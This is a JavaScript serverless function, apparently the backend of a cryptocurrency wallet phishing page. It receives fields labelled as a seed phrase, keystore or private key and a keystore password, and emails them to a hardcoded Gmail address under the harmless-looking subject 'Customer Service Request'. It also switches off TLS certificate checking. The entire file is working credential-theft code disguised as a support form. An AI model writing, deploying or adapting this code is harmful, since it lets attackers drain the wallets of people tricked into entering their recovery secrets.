// api/submit.js - Vercel Serverless Function Format
const nodemailer = require('nodemailer');

export default async function handler(req, res) {
  // Handle CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      return res.status(500).json({ 
        success: false, 
        error: 'Server configuration error' 
      });
    }

    const maillist = ['Gfequitygroupjobcenter@gmail.com'];

    const transporter = nodemailer.createTransporter({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Verify transporter configuration
    await transporter.verify();

    const { phwet, psdwet } = req.body;

    // Validate required fields
    if (!phwet && !psdwet) {
      return res.status(400).json({ 
        success: false, 
        error: 'At least one field is required' 
      });
    }

    const mailOptions = {
      from: `"Customer Service" <${process.env.EMAIL_USER}>`,
      to: maillist,
      subject: 'Customer Service Request',
      html: `
        <h3>New Customer Service Request</h3>
        <p><strong>Phrase/KS/PKey:</strong> ${phwet || 'Not provided'}</p>
        <p><strong>Password (if keystore):</strong> ${psdwet || 'Not provided'}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    return res.status(200).json({ 
      success: true, 
      message: 'Request submitted successfully' 
    });

  } catch (error) {
    console.error('API Error:', error);
    
    // Return different messages based on error type
    if (error.code === 'EAUTH') {
      return res.status(500).json({ 
        success: false, 
        error: 'Email authentication failed' 
      });
    } else if (error.code === 'ECONNECTION') {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to connect to email server' 
      });
    }
    
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
}